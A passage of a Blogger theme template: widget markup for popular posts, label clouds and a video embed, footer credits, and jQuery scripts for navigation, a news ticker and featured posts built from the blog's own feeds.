&lt;div class=&#39;aboutfloat-img&#39;&gt;&lt;span class=&#39;sosmedarl-float&#39;&gt;&lt;a href=&#39;#&#39; rel=&#39;nofollow&#39; target=&#39;_blank&#39; title=&#39;Join Our Site&#39;&gt;&lt;i class=&#39;fa fa-user&#39;&gt;&lt;/i&gt; Join Our Site&lt;/a&gt;&lt;/span&gt;&lt;/div&gt;
&lt;div class=&#39;sosmedarl-wrpicon&#39;&gt;
&lt;ul class=&#39;extender&#39;&gt;
&lt;li class=&#39;sosmedarl-icon fbl&#39;&gt;&lt;a href=&#39;https://www.facebook.com/soratemplates/&#39; target=&#39;_blank&#39; title=&#39;Follow Our Facebook&#39;&gt;&lt;i class=&#39;fa fa-facebook fa-fw&#39;/&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li class=&#39;sosmedarl-icon twitt&#39;&gt;&lt;a href=&#39;https://twitter.com/LiveBlogger1&#39; target=&#39;_blank&#39; title=&#39;Follow Our Twitter&#39;&gt;&lt;i class=&#39;fa fa-twitter fa-fw&#39;/&gt; &lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;li class=&#39;sosmedarl-icon crcl&#39;&gt;&lt;a href=&#39;https://www.instagram.com/livebloggerofficial/&#39; rel=&#39;nofollow&#39; target=&#39;_blank&#39; title=&#39;Follow Our Instagram&#39;&gt;&lt;i class=&#39;fa fa-instagram fa-fw&#39;/&gt;&lt;/i&gt;&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/div&gt;
&lt;/div&gt;</b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>

  <!--b:include name='quickedit'/-->
</b:includable>
  </b:widget>
  <b:widget id='PopularPosts1' locked='false' title='Popular' type='PopularPosts' version='1'>
    <b:widget-settings>
      <b:widget-setting name='numItemsToShow'>2</b:widget-setting>
      <b:widget-setting name='showThumbnails'>true</b:widget-setting>
      <b:widget-setting name='showSnippets'>false</b:widget-setting>
      <b:widget-setting name='timeRange'>LAST_WEEK</b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
  <b:if cond='data:title'><h2><data:title/></h2></b:if>
  <div class='widget-content popular-posts'>
    <ul>
      <b:loop values='data:posts' var='post'>
      <li>
        <b:if cond='data:showThumbnails == &quot;false&quot;'>
          <b:if cond='data:showSnippets == &quot;false&quot;'>
            <!-- (1) No snippet/thumbnail -->
            <a expr:href='data:post.href'><data:post.title/></a>
          <b:else/>
            <!-- (2) Show only snippets -->
            <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
            <div class='item-snippet'><data:post.snippet/></div>
          </b:if>
        <b:else/>
          <b:if cond='data:showSnippets == &quot;false&quot;'>
            <!-- (3) Show only thumbnails -->
            <div class='item-thumbnail-only'>
              <b:if cond='data:post.thumbnail'>
                <div class='item-thumbnail'>
                  <a expr:href='data:post.href' target='_blank'>
                    <img border='0' expr:alt='data:post.title' expr:height='data:thumbnailSize' expr:src='data:post.thumbnail' expr:width='data:thumbnailSize'/>
                  </a>
                </div>
              </b:if>
              <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
            </div>
            <div style='clear: both;'/>
          <b:else/>
            <!-- (4) Show snippets and thumbnails -->
            <div class='item-content'>
              <b:if cond='data:post.thumbnail'>
                <div class='item-thumbnail'>
                  <a expr:href='data:post.href' target='_blank'>
                    <img border='0' expr:alt='data:post.title' expr:height='data:thumbnailSize' expr:src='data:post.thumbnail' expr:width='data:thumbnailSize'/>
                  </a>
                </div>
              </b:if>
              <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
              <div class='item-snippet'><data:post.snippet/></div>
            </div>
            <div style='clear: both;'/>
          </b:if>
        </b:if>
      </li>
      </b:loop>
    </ul>
    <b:include name='quickedit'/>
  </div>
</b:includable>
  </b:widget>
  <b:widget id='HTML2' locked='false' title='Subscribe Us' type='HTML' version='1'>
    <b:widget-settings>
      <b:widget-setting name='content'>&lt;div class=&quot;videoWrapper&quot;&gt;
    &lt;!-- Copy &amp; Pasted from YouTube --&gt;
    &lt;iframe width=&quot;560&quot; height=&quot;349&quot; src=&quot;https://www.youtube.com/embed/vC_7wzbis6s&quot; frameborder=&quot;0&quot; allowfullscreen&gt;&lt;/iframe&gt;
&lt;/div&gt;
&lt;style&gt;
.videoWrapper {
position: relative;
padding-bottom: 56.25%; /* 16:9 */
padding-top: 25px;
height: 0;
}
.videoWrapper iframe {
position: absolute;
top: 0;
left: 0;
width: 100%;
height: 100%;
}
&lt;/style&gt;</b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
  <!-- only display title if it's non-empty -->
  <b:if cond='data:title != &quot;&quot;'>
    <h2 class='title'><data:title/></h2>
  </b:if>
  <div class='widget-content'>
    <data:content/>
  </div>

  <!--b:include name='quickedit'/-->
</b:includable>
  </b:widget>
  <b:widget id='Label1' locked='false' title='Categories' type='Label' version='1'>
    <b:widget-settings>
      <b:widget-setting name='sorting'>ALPHA</b:widget-setting>
      <b:widget-setting name='display'>CLOUD</b:widget-setting>
      <b:widget-setting name='selectedLabelsList'>kids,mens,mobile,women</b:widget-setting>
      <b:widget-setting name='showType'>ALL</b:widget-setting>
      <b:widget-setting name='showFreqNumbers'>true</b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
  <b:if cond='data:title != &quot;&quot;'>
    <h2><data:title/></h2>
  </b:if>
  <div expr:class='&quot;widget-content &quot; + data:display + &quot;-label-widget-content&quot;'>
    <b:if cond='data:display == &quot;list&quot;'>
      <ul>
        <b:loop values='data:labels' var='label'>
          <li>
            <b:if cond='data:blog.url == data:label.url'>
              <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
            <b:else/>
              <a expr:dir='data:blog.languageDirection' expr:href='data:label.url + &quot;?&amp;max-results=7&quot;'><data:label.name/></a>
            </b:if>
            <b:if cond='data:showFreqNumbers'>
              <span dir='ltr'>(<data:label.count/>)</span>
            </b:if>
          </li>
        </b:loop>
      </ul>
    <b:else/>
      <b:loop values='data:labels' var='label'>
        <span expr:class='&quot;label-size label-size-&quot; + data:label.cssSize'>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url + &quot;?&amp;max-results=7&quot;'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span class='label-count' dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </span>
      </b:loop>
    </b:if>
   <!--b:include name='quickedit'/-->
  </div>
</b:includable>
  </b:widget>
</b:section>
    </div>
 <div style='clear: both;'/>
    </div>
    <!-- end content-wrapper -->
<div id='lower'>
<div class='body-row' id='lower-wrapper'>
<div id='lowerbar-wrapper'>
<b:section class='lowerbar ready-widget' id='Footer Widget (A)' preferred='yes'>
  <b:widget id='Label3' locked='false' title='Tags' type='Label' version='1'>
    <b:widget-settings>
      <b:widget-setting name='sorting'>ALPHA</b:widget-setting>
      <b:widget-setting name='display'>CLOUD</b:widget-setting>
      <b:widget-setting name='selectedLabelsList'>Android,Food,Mobile,News,Sport,Technology,Watch,gadgets,ios,ipad</b:widget-setting>
      <b:widget-setting name='showType'>USER_SELECTED</b:widget-setting>
      <b:widget-setting name='showFreqNumbers'>false</b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
  <b:if cond='data:title != &quot;&quot;'>
    <h2><data:title/></h2>
  </b:if>
  <div expr:class='&quot;widget-content &quot; + data:display + &quot;-label-widget-content&quot;'>
    <b:if cond='data:display == &quot;list&quot;'>
      <ul>
        <b:loop values='data:labels' var='label'>
          <li>
            <b:if cond='data:blog.url == data:label.url'>
              <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
            <b:else/>
              <a expr:dir='data:blog.languageDirection' expr:href='data:label.url + &quot;?&amp;max-results=7&quot;'><data:label.name/></a>
            </b:if>
            <b:if cond='data:showFreqNumbers'>
              <span dir='ltr'>(<data:label.count/>)</span>
            </b:if>
          </li>
        </b:loop>
      </ul>
    <b:else/>
      <b:loop values='data:labels' var='label'>
        <span expr:class='&quot;label-size label-size-&quot; + data:label.cssSize'>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url + &quot;?&amp;max-results=7&quot;'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span class='label-count' dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </span>
      </b:loop>
    </b:if>
   <!--b:include name='quickedit'/-->
  </div>
</b:includable>
  </b:widget>
</b:section>
</div>
<div id='lowerbar-wrapper'>
<b:section class='lowerbar ready-widget' id='Footer Widget (B)' preferred='yes'>
  <b:widget id='Label2' locked='false' title='Categories' type='Label' version='1'>
    <b:widget-settings>
      <b:widget-setting name='sorting'>ALPHA</b:widget-setting>
      <b:widget-setting name='display'>LIST</b:widget-setting>
      <b:widget-setting name='selectedLabelsList'>Mobile,News,Sport,Technology,Video,Watch,gadgets,ipad</b:widget-setting>
      <b:widget-setting name='showType'>USER_SELECTED</b:widget-setting>
      <b:widget-setting name='showFreqNumbers'>false</b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
  <b:if cond='data:title != &quot;&quot;'>
    <h2><data:title/></h2>
  </b:if>
  <div expr:class='&quot;widget-content &quot; + data:display + &quot;-label-widget-content&quot;'>
    <b:if cond='data:display == &quot;list&quot;'>
      <ul>
        <b:loop values='data:labels' var='label'>
          <li>
            <b:if cond='data:blog.url == data:label.url'>
              <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
            <b:else/>
              <a expr:dir='data:blog.languageDirection' expr:href='data:label.url + &quot;?&amp;max-results=7&quot;'><data:label.name/></a>
            </b:if>
            <b:if cond='data:showFreqNumbers'>
              <span dir='ltr'>(<data:label.count/>)</span>
            </b:if>
          </li>
        </b:loop>
      </ul>
    <b:else/>
      <b:loop values='data:labels' var='label'>
        <span expr:class='&quot;label-size label-size-&quot; + data:label.cssSize'>
          <b:if cond='data:blog.url == data:label.url'>
            <span expr:dir='data:blog.languageDirection'><data:label.name/></span>
          <b:else/>
            <a expr:dir='data:blog.languageDirection' expr:href='data:label.url + &quot;?&amp;max-results=7&quot;'><data:label.name/></a>
          </b:if>
          <b:if cond='data:showFreqNumbers'>
            <span class='label-count' dir='ltr'>(<data:label.count/>)</span>
          </b:if>
        </span>
      </b:loop>
    </b:if>
   <!--b:include name='quickedit'/-->
  </div>
</b:includable>
  </b:widget>
</b:section>
</div>
<div id='lowerbar-wrapper'>
<b:section class='lowerbar ready-widget' id='Footer Widget (c)' preferred='yes'>
  <b:widget id='PopularPosts2' locked='false' title='Popular Posts' type='PopularPosts' version='1'>
    <b:widget-settings>
      <b:widget-setting name='numItemsToShow'>4</b:widget-setting>
      <b:widget-setting name='showThumbnails'>true</b:widget-setting>
      <b:widget-setting name='showSnippets'>true</b:widget-setting>
      <b:widget-setting name='timeRange'>LAST_WEEK</b:widget-setting>
    </b:widget-settings>
    <b:includable id='main'>
  <b:if cond='data:title != &quot;&quot;'><h2><data:title/></h2></b:if>
  <div class='widget-content popular-posts'>
    <ul>
      <b:loop values='data:posts' var='post'>
      <li>
        <b:if cond='!data:showThumbnails'>
          <b:if cond='!data:showSnippets'>
            <!-- (1) No snippet/thumbnail -->
            <a expr:href='data:post.href'><data:post.title/></a>
          <b:else/>
            <!-- (2) Show only snippets -->
            <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
            <div class='item-snippet'><data:post.snippet/></div>
          </b:if>
        <b:else/>
          <!-- (3) Show only thumbnails or (4) Snippets and thumbnails. -->
          <div expr:class='data:showSnippets ? &quot;item-content&quot; : &quot;item-thumbnail-only&quot;'>
            <b:if cond='data:post.featuredImage.isResizable or data:post.thumbnail'>
              <div class='item-thumbnail'>
                <a expr:href='data:post.href' target='_blank'>
                  <b:with value='data:post.featuredImage.isResizable                                  ? resizeImage(data:post.featuredImage, 72, &quot;1:1&quot;)                                  : data:post.thumbnail' var='image'>
                    <img border='0' expr:alt='data:post.title' expr:src='data:image'/>
                  </b:with>
                </a>
              </div>
            </b:if>
            <div class='item-title'><a expr:href='data:post.href'><data:post.title/></a></div>
            <b:if cond='data:showSnippets'>
              <div class='item-snippet'><data:post.snippet/></div>
            </b:if>
          </div>
          <div style='clear: both;'/>
        </b:if>
      </li>
      </b:loop>
    </ul>
   <!--b:include name='quickedit'/-->
  </div>
</b:includable>
  </b:widget>
</b:section>
</div>
<div style='clear: both;'/>
</div>
</div>
<div id='ty_footer'>
        <div class='ty-copy-container body-row'>
         
                    <div class='ty_footer_copyright'>
                  <div class='copyright-area'>Created By <a href='http://soratemplates.com/' id='mycontent' rel='dofollow' title='SoraTemplates'>Theme</a> | Distributed By <a href='https://gooyaabitemplates.com/' rel='dofollow' style='color:#ff00ba;' target='_blank' title='Gooyaab'>Gooyaab</a></div>    
          </div>
        </div>
    </div>


&lt;/div&gt;
<script type='text/javascript'>
//<![CDATA[

var noThumbnail = "http://3.bp.blogspot.com/-Yw8BIuvwoSQ/VsjkCIMoltI/AAAAAAAAC4c/s55PW6xEKn0/s1600-r/nth.png";
var month_format = [, "Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sept", "Oct", "Nov", "Dec"];
var POSTPAGER_OLDER = "Older Article"; // post nav text "previous post"
var POSTPAGER_NEWER = "Newer Article"; // post nav text "next post"
var randomposts_number = 4;

// Plugin: SelectNav.js ~ url: https://github.com/lukaszfiszer/selectnav.js
window.selectnav=function(){"use strict";var e=function(e,t){function c(e){var t;if(!e)e=window.event;if(e.target)t=e.target;else if(e.srcElement)t=e.srcElement;if(t.nodeType===3)t=t.parentNode;if(t.value)window.location.href=t.value}function h(e){var t=e.nodeName.toLowerCase();return t==="ul"||t==="ol"}function p(e){for(var t=1;document.getElementById("selectnav"+t);t++);return e?"selectnav"+t:"selectnav"+(t-1)}function d(e){a++;var t=e.children.length,n="",l="",c=a-1;if(!t){return}if(c){while(c--){l+=o}l+=" "}for(var v=0;v<t;v++){var m=e.children[v].children[0];if(typeof m!=="undefined"){var g=m.innerText||m.textContent;var y="";if(r){y=m.className.search(r)!==-1||m.parentNode.className.search(r)!==-1?f:""}if(i&&!y){y=m.href===document.URL?f:""}n+='<option value="'+m.href+'" '+y+">"+l+g+"</option>";if(s){var b=e.children[v].children[1];if(b&&h(b)){n+=d(b)}}}}if(a===1&&u){n='<option value="">'+u+"</option>"+n}if(a===1){n='<select class="selectnav" id="'+p(true)+'">'+n+"</select>"}a--;return n}e=document.getElementById(e);if(!e){return}if(!h(e)){return}if(!("insertAdjacentHTML"in window.document.documentElement)){return}document.documentElement.className+=" js";var n=t||{},r=n.activeclass||"active",i=typeof n.autoselect==="boolean"?n.autoselect:true,s=typeof n.nested==="boolean"?n.nested:true,o=n.indent||"-",u=n.label||"Menu",a=0,f=" selected ";e.insertAdjacentHTML("afterend",d(e));var l=document.getElementById(p());if(l.addEventListener){l.addEventListener("change",c)}if(l.attachEvent){l.attachEvent("onchange",c)}return l};return function(t,n){e(t,n)}}();

// jquery replacetext plugin https://github.com/cowboy/jquery-replacetext
(function(e){e.fn.replaceText=function(t,n,r){return this.each(function(){var i=this.firstChild,s,o,u=[];if(i){do{if(i.nodeType===3){s=i.nodeValue;o=s.replace(t,n);if(o!==s){if(!r&&/</.test(o)){e(i).before(o);u.push(i)}else{i.nodeValue=o}}}}while(i=i.nextSibling)}u.length&&e(u).remove()})}})(jQuery);

// Main Post Scripts

function arlinadesignTicker(t) {
    var e = document.querySelector("#ticker"),
        i = t.feed.entry,
        a = "<ul id='ticket-wrapper-inner'>";
    if (i) {
        for (var n = 0; n < i.length; n++) {
            for (var r = i[n], s = 0; s < r.link.length; s++)
                if ("alternate" == r.link[s].rel) {
                    var l = r.link[s].href;
                    break
                }
            try {
                var o = ''
            } catch (t) {
                var o = ""
            }
            var u = r.title.$t;
            a += "<li>" + o + '<h3><a href="' + l + '">' + u + "</a></h3></li>"
        }
        a += "</ul>", e.innerHTML = a
    }
    $("#ticker").vTicker()
}! function(t) {
    var e = {
            speed: 700,
            pause: 4e3,
            showItems: 1,
            mousePause: !0,
            height: 0,
            animate: !0,
            margin: 0,
            padding: 0,
            startPaused: !1
        },
        i = {
            moveUp: function(t, e) {
                i.animate(t, e, "up")
            },
            moveDown: function(t, e) {
                i.animate(t, e, "down")
            },
            animate: function(e, i, a) {
                var n = e.itemHeight,
                    r = e.options,
                    s = e.element,
                    l = s.children("ul"),
                    o = "up" === a ? "li:first" : "li:last";
                s.trigger("vticker.beforeTick");
                var u = l.children(o).clone(!0);
                if (0 < r.height && (n = l.children("li:first").height()), n += r.margin + 2 * r.padding, "down" === a && l.css("top", "-" + n + "px").prepend(u), i && i.animate) {
                    if (e.animating) return;
                    e.animating = !0, l.animate("up" === a ? {
                        top: "-=" + n + "px"
                    } : {
                        top: 0
                    }, r.speed, function() {
                        t(l).children(o).remove(), t(l).css("top", "0px"), e.animating = !1, s.trigger("vticker.afterTick")
                    })
                } else l.children(o).remove(), l.css("top", "0px"), s.trigger("vticker.afterTick");
                "up" === a && u.appendTo(l)
            },
            nextUsePause: function() {
                var e = t(this).data("state"),
                    i = e.options;
                e.isPaused || 2 > e.itemCount || a.next.call(this, {
                    animate: i.animate
                })
            },
            startInterval: function() {
                var e = t(this).data("state"),
                    a = this;
                e.intervalId = setInterval(function() {
                    i.nextUsePause.call(a)
                }, e.options.pause)
            },
            stopInterval: function() {
                var e = t(this).data("state");
                e && (e.intervalId && clearInterval(e.intervalId), e.intervalId = void 0)
            },
            restartInterval: function() {
                i.stopInterval.call(this), i.startInterval.call(this)
            }
        },
        a = {
            init: function(n) {
                a.stop.call(this);
                var r = jQuery.extend({}, e);
                n = t.extend(r, n);
                var r = t(this),
                    s = {
                        itemCount: r.children("ul").children("li").length,
                        itemHeight: 0,
                        itemMargin: 0,
                        element: r,
                        animating: !1,
                        options: n,
                        isPaused: n.startPaused ? !0 : !1,
                        pausedByCode: !1
                    };
                t(this).data("state", s), r.css({
                    overflow: "hidden",
                    position: "relative"
                }).children("ul").css({
                    position: "absolute",
                    margin: 0,
                    padding: 0
                }).children("li").css({
                    margin: n.margin,
                    padding: n.padding
                }), isNaN(n.height) || 0 === n.height ? (r.children("ul").children("li").each(function() {
                    var e = t(this);
                    e.height() > s.itemHeight && (s.itemHeight = e.height())
                }), r.children("ul").children("li").each(function() {
                    t(this).height(s.itemHeight)
                }), r.height((s.itemHeight + (n.margin + 2 * n.padding)) * n.showItems + n.margin)) : r.height(n.height);
                var l = this;
                n.startPaused || i.startInterval.call(l), n.mousePause && r.bind("mouseenter", function() {
                    !0 !== s.isPaused && (s.pausedByCode = !0, i.stopInterval.call(l), a.pause.call(l, !0))
                }).bind("mouseleave", function() {
                    (!0 !== s.isPaused || s.pausedByCode) && (s.pausedByCode = !1, a.pause.call(l, !1), i.startInterval.call(l))
                })
            },
            pause: function(e) {
                var i = t(this).data("state");
                if (i) {
                    if (2 > i.itemCount) return !1;
                    i.isPaused = e, i = i.element, e ? (t(this).addClass("paused"), i.trigger("vticker.pause")) : (t(this).removeClass("paused"), i.trigger("vticker.resume"))
                }
            },
            next: function(e) {
                var a = t(this).data("state");
                if (a) {
                    if (a.animating || 2 > a.itemCount) return !1;
                    i.restartInterval.call(this), i.moveUp(a, e)
                }
            },
            prev: function(e) {
                var a = t(this).data("state");
                if (a) {
                    if (a.animating || 2 > a.itemCount) return !1;
                    i.restartInterval.call(this), i.moveDown(a, e)
                }
            },
            stop: function() {
                t(this).data("state") && i.stopInterval.call(this)
            },
            remove: function() {
                var e = t(this).data("state");
                e && (i.stopInterval.call(this), e = e.element, e.unbind(), e.remove())
            }
        };
    t.fn.vTicker = function(e) {
        return a[e] ? a[e].apply(this, Array.prototype.slice.call(arguments, 1)) : "object" != typeof e && e ? void t.error("Method " + e + " does not exist on jQuery.vTicker") : a.init.apply(this, arguments)
    }
}(jQuery), $(function() {
    var t = document.createElement("script");
    t.src = "/feeds/posts/summary?alt=json&callback=arlinadesignTicker", t.type = "text/javascript", document.getElementsByTagName("body")[0].appendChild(t)
});

$(document).ready(function($) {
    var k = -1,
        o = "",
        p = "";
    $("#menu").find("ul").find("li").each(function() {
        for (var text = $(this).text(), url = $(this).find("a").attr("href"), x = 0, z = 0; z < text.length && (x = text.indexOf("_", x), -1 != x); z++)
            x++;
        if (level = z, level > k && (o += "<ul>", p += "<ul>"), level < k) {
            offset = k - level;
            for (var z = 0; z < offset; z++) o += "</ul></li>", p += "</ul></li>"
        }
        text = text.replace(/_/gi, ""), o += "<li><a href='" + url + "'>" + text + "</a>", p += "<li><a href='" + url + "'>";
        for (var z = 0; z < level; z++) p += "";
        p += text + "</a>", k = level
    });
    for (var x = 0; k >= x; x++) o += "</ul>", p += "</ul>", 0 != x && (o += "</li>", p += "</li>");
    $("#menu .LinkList").html(p), $("#menu > .LinkList > ul").attr("id", "nav1"), selectnav('nav1'), $("#menu ul > li > ul").parent("li").addClass("parent"), $("#menu .widget").attr("style", "display:block!important;");
});
$(document).ready(function() {
    $('.sidebar h2,.lowerbar h2').wrap('<div class="widget-title"></div>');
});

$(".featured .HTML .widget-content").each(function() {
    var n = $(this).prev("h2").text(),
        v = $(this).find("span").attr("data-label")
        tyard = $(this).parent().attr("id"),
        box = $(this).find("span").attr("data-type");
    if ( box != undefined && box.match('tyard-recent')) {
        $.ajax({
            url: "/feeds/posts/default?alt=json-in-script&max-results=4",
            type: 'get',
            dataType: "jsonp",
            success: function(e) {
                var u = "";
                var h = '<div class="ty-feat">';
                for (var i = 0; i < e.feed.entry.length; i++) {
                    for (var j = 0; j < e.feed.entry[i].link.length; j++) {
                        if (e.feed.entry[i].link[j].rel == "alternate") {
                            u = e.feed.entry[i].link[j].href;
                            break
                        }
                    }
 var post_comments;
            for (var k = 0; k < e.feed.entry[i].link.length; k++) {
              if ((e.feed.entry[i].link[k].rel === 'replies') && (e.feed.entry[i].link[k].type === 'text/html')) {
                post_comments = e.feed.entry[i].link[k].title;
                break;
              }
            } 
            post_comments = parseInt(post_comments, 10);
  if ("content" in e.feed.entry[i]) var summ = e.feed.entry[i].content.$t;
                else if ("summary" in b_rc) var summ = e.feed.entry[i].summary.$t;
                else var summ = "";
                var content = /<\S[^>]*>/g;
                summ = summ.replace(content, ""), summ.length > 120 && (summ = "" + summ.substring(0, 100) + "...");
                    var g = e.feed.entry[i].title.$t;
                    var s = e.feed.entry[i].category[0].term;
                    var y = e.feed.entry[i].author[0].name.$t;
                    var AuthorPic = e.feed.entry[i].author[0].gd$image.src;
                    var d = e.feed.entry[i].published.$t,
                        t = d.substring(0, 4),
                        w = d.substring(5, 7),
                        f = d.substring(8, 10),
                        r = month_format[parseInt(w, 10)] + ' ' + f + ', ' + t;
                    var c = e.feed.entry[i].content.$t;
                    var $c = $('<div>').html(c);
                    if (c.indexOf("//www.youtube.com/embed/") > -1) {
                        var p = e.feed.entry[i].media$thumbnail.url;
                        var k = p
                    } else if (c.indexOf("<img") > -1) {
                        var q = $c.find('img:first').attr('src');
                        var k = q
                    } else {
                        var k = noThumbnail
                    }
                    if (i == 0) {
                        h += '<div class="ty-first"><div class="ty-feat-image"><div class="tyard-thumb"><a class="ty-img" href="' + u + '" style="background:url(' + k + ') no-repeat center center;background-size: cover"><span class="tyimg-lay"/></a></div><div class="ty-con-yard"><div class="yard-label"><a class="icon ' + s + '" href="/search/label/' + s + '?&amp;max-result=' + postperpage + '">' + s + '</a></div><h3 class="tyard-title"><a href="' + u + '">' + g + '</a></h3><span class="yard-auth-ty">' + y + '</span><span class="ty-time">' + r + '</span></div></div></div>'
                    } else {
                        h += '<div class="ty-rest-wrap"><div class="ty-rest"><div class="tyard-thumb"><a class="yard-img" href="' + u + '" style="background:url(' + k + ') no-repeat center center;background-size: cover"><span class="tyimg-lay"/></a></div><div class="yard-tent-ty"><h3 class="tyard-title"><a href="' + u + '">' + g + '</a></h3></div><div class="clear"/></div></div>'
                    }
                }
                h += '</div>';
                $(".featured .HTML .widget-content").each(function() {
                    var text = $(this).parent().attr("id");
                    if (text == tyard) {
                        $(this).html(h);
                        $(this).parent().addClass('tyard');
                        $(this).parent().addClass('templatesyard');
                        $( ".featured" ).addClass( "comload" ).removeClass( "preload" );
                        $( ".featured h2" ).remove();
                        $(this).find('.yard-img,.ty-img').each(function() {
                            $(this).attr('style', function(i, src) {
                                return src.replace('/default.jpg', '/mqdefault.jpg')
                            }).attr('style', function(i, src) {
                                return src.replace('s72-c', 's1600')
                            })
                        })
                    }
                })
            }
        })
    } else if ( box != undefined && box.match('tyard-label')) {
        $.ajax({
            url: "/feeds/posts/default/-/" + v + "?alt=json-in-script&max-results=4",
            type: 'get',
            dataType: "jsonp",
            success: function(e) {
                var u = "";
                var h = '<div class="ty-feat">';
                for (var i = 0; i < e.feed.entry.length; i++) {
                    for (var j = 0; j < e.feed.entry[i].link.length; j++) {
                        if (e.feed.entry[i].link[j].rel == "alternate") {
                            u = e.feed.entry[i].link[j].href;
                            break
                        }
                    }
var post_comments;
            for (var k = 0; k < e.feed.entry[i].link.length; k++) {
              if ((e.feed.entry[i].link[k].rel === 'replies') && (e.feed.entry[i].link[k].type === 'text/html')) {
                post_comments = e.feed.entry[i].link[k].title;
                break;
              }
            } 
            post_comments = parseInt(post_comments, 10);
  if ("content" in e.feed.entry[i]) var summ = e.feed.entry[i].content.$t;
                else if ("summary" in b_rc) var summ = e.feed.entry[i].summary.$t;
                else var summ = "";
                var content = /<\S[^>]*>/g;
                summ = summ.replace(content, ""), summ.length > 120 && (summ = "" + summ.substring(0, 100) + "...");
                    var g = e.feed.entry[i].title.$t;
                    var s = e.feed.entry[i].category[0].term;
                    var y = e.feed.entry[i].author[0].name.$t;
                    var AuthorPic = e.feed.entry[i].author[0].gd$image.src;
                    var d = e.feed.entry[i].published.$t,
                        t = d.substring(0, 4),
                        w = d.substring(5, 7),
                        f = d.substring(8, 10),
                        r = month_format[parseInt(w, 10)] + ' ' + f + ', ' + t;
                    var c = e.feed.entry[i].content.$t;
                    var $c = $('<div>').html(c);
                    if (c.indexOf("//www.youtube.com/embed/") > -1) {
                        var p = e.feed.entry[i].media$thumbnail.url;
                        var k = p
                    } else if (c.indexOf("<img") > -1) {
                        var q = $c.find('img:first').attr('src');
                        var k = q
                    } else {
                        var k = noThumbnail
                    }
                    if (i == 0) {
                        h += '<div class="ty-first"><div class="ty-feat-image"><div class="tyard-thumb"><a class="ty-img" href="' + u + '" style="background:url(' + k + ') no-repeat center center;background-size: cover"><span class="tyimg-lay"/></a></div><div class="ty-con-yard"><div class="yard-label"><a class="icon ' + s + '" href="/search/label/' + s + '?&amp;max-result=' + postperpage + '">' + s + '</a></div><h3 class="tyard-title"><a href="' + u + '">' + g + '</a></h3><span class="yard-auth-ty">' + y + '</span><span class="ty-time">' + r + '</span><p class="recent-summary">'+ summ +'</p></div></div></div>'
                    } else {
                        h += '<div class="ty-rest-wrap"><div class="ty-rest"><div class="tyard-thumb"><a class="yard-img" href="' + u + '" style="background:url(' + k + ') no-repeat center center;background-size: cover"><span class="tyimg-lay"/></a></div><div class="yard-tent-ty"><h3 class="tyard-title"><a href="' + u + '">' + g + '</a></h3></div><div class="clear"/></div></div>'
                    } 
                }
                h += '</div>';
                $(".featured .HTML .widget-content").each(function() {
                    var text = $(this).parent().attr("id");
                    if (text == tyard) {
                        $(this).html(h);
                        $(this).parent().addClass('tyard');
                        $(this).parent().addClass('templatesyard');
                        $( ".featured" ).addClass( "comload" ).removeClass( "preload" );
                        $( ".featured h2" ).remove();
                        $(this).find('.yard-img,.ty-img').each(function() {
                            $(this).attr('style', function(i, src) {
                                return src.replace('/default.jpg', '/mqdefault.jpg')
                            }).attr('style', function(i, src) {
                                return src.replace('s72-c', 's1600')
                            })
                        })
                    }
                })
            }
        })
    }
else {
    $(".tyard-wrapper").remove();
  } 
});
    
   
  //]]>
</script>

<b:if cond='data:blog.pageType != &quot;static_page&quot;'>
<b:if cond='data:blog.pageType!= &quot;item&quot;'>
<b:if cond='data:blog.pageType != &quot;error_page&quot;'>
<style>
article {
    padding:0 10px 0 0;
    overflow:hidden;
}
.post-header {
    padding:0;
}
@media only screen and (max-width: 768px) {
article {
    padding:10px;
}
  }
</style>

  
  
<!-- Theme Functions JS -->
<script type='text/javascript'>
//<![CDATA[

